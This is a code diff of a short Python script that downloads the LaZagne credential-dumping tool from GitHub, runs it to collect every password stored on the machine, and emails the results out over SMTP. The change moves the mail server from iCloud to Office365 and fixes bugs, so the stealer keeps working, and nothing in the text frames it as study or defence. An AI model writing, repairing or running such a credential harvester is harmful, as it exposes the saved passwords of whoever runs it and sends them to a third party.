@@ -11,24 +11,17 @@ def Download(url):
 
     print(GetResponse)
 
-
 def SendMail(email, password, message):
 
-    email = input("What is your email")
-    password = input("What is your password")
-
-    result = subprocess.check_output("LaZagne.exe all", shell=True)
-    print(result)
-
-    server = smtplib.SMTP("smtp.mail.me.com", 587)
+    server = smtplib.SMTP("smtp.office365.com", 587)
     server.starttls()
     server.login(email, password)
-    server.SendMail(email, email, message)
+    server.sendmail(email, email, message)
     server.quit()
-
-    SendMail(email, password, result)
 
 Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 
-result = subprocess.check_output("LaZagne.exe all", shell=True)
-SendMail(email, password, result)
+result = subprocess.check_output("lazagne.exe all", shell=True);
+print(result)
+
+SendMail("", "", result)
